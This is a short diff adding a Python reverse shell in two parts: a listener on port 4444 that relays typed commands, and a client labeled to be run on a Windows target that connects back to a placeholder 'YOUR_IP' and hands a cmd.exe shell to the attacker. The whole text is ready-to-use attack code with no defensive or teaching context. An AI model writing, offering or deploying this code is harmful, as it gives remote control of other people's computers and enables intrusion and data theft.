@@ -1,0 +1,20 @@
+Server (Listener – run this first on your machine)
+import socket
+s=socket.socket()
+s.bind(("0.0.0.0",4444))
+s.listen(1)
+c,a=s.accept()
+while True:
+    cmd=input("shell> ")
+    if cmd.lower() in["exit","quit"]:break
+    c.send(cmd.encode()+b"\n")
+    print(c.recv(9999).decode(errors="ignore"),end="")
+c.close()
+Client (Reverse shell – run on Windows target)
+import socket,os,subprocess
+s=socket.socket()
+s.connect(("YOUR_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call("cmd.exe")
